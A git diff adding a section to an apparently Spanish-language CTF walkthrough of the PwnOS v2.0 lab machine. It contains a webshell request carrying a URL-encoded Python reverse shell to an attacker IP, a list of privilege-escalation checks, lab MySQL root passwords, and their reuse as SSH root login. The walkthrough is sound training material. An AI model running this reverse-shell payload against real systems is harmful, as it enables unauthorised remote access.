@@ -314,6 +314,44 @@ Table: users
 
 <img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos14.jpg" width=80% />
 
+> Ejecutamos la webshell y obtener conexión reversa:
+
+```
+http://10.10.10.100/blog/images/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.10.130%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+```
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos15.jpg" width=80% />
+
+
+## 5. Elevando Privilegios
+
+> Probé muchas técnicas SIN EXITO que voy a resumir aquí:
+- SUDO
+- NFS
+- CRON
+- LLAVES SSH
+- Busqué credenciales en archivos de configuración y encontré algunas que me llamaron la atención.
+- SUID y Versión del Kernel, encontré "/usr/lib/pt_chown" invertí bastante tiempo aquí pero sin exito.
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos16.jpg" width=80% />
+
+- Encontré el password de ROOT de MYSQL: "goodday". 
+- En la carpeta /VAR también estaba hay un archivo de configuración con la contraseña del usuario ROOT de MYSQL: root@ISIntS
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos17.jpg" width=80% />
+
+### 5.1. Accediendo como ROOT a través de SSH
+
+> Y como suele ocurrir en los CTF las credenciales que se obtienen tienen que ser probadas como acceso. En este caso el acceso la credenciale del usuario ROOT es: root@ISIntS
+
+<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos18.jpg" width=80% />
+
+
+## 5. BONUS TRACK: Todos los caminos llevan a ROMA
+
+- Después de resolver el CTF revisé como lo habían resuelto otras personas (puro morbo) y había otro camino interesante:  a través de una carga de archivos en MYSQL. De puro "picón" me puse a resolverlo de esa manera:
+
+
 
 
 
